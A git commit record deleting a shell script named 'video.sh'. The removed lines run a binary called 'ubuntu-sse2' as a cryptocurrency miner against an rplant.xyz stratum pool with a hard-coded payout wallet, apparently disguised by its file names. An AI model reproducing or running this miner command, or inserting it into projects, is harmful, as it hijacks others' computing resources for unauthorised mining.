7948d39389e0827746724cd6ad18bfa297003d87
ivanbest202201 <96770549+ivanbest202201@users.noreply.github.com>
2022-01-05 22:44:33 +0300

    Delete video.sh

--- video.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-#
-# Choose nearest stratum:
-#       stratum-ru.rplant.xyz   /Moscow/
-#       stratum-eu.rplant.xyz   /London/
-#       stratum-asia.rplant.xyz /Singapore/
-#       stratum-na.rplant.xyz   /Toronto/
-#
-./ubuntu-sse2 -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
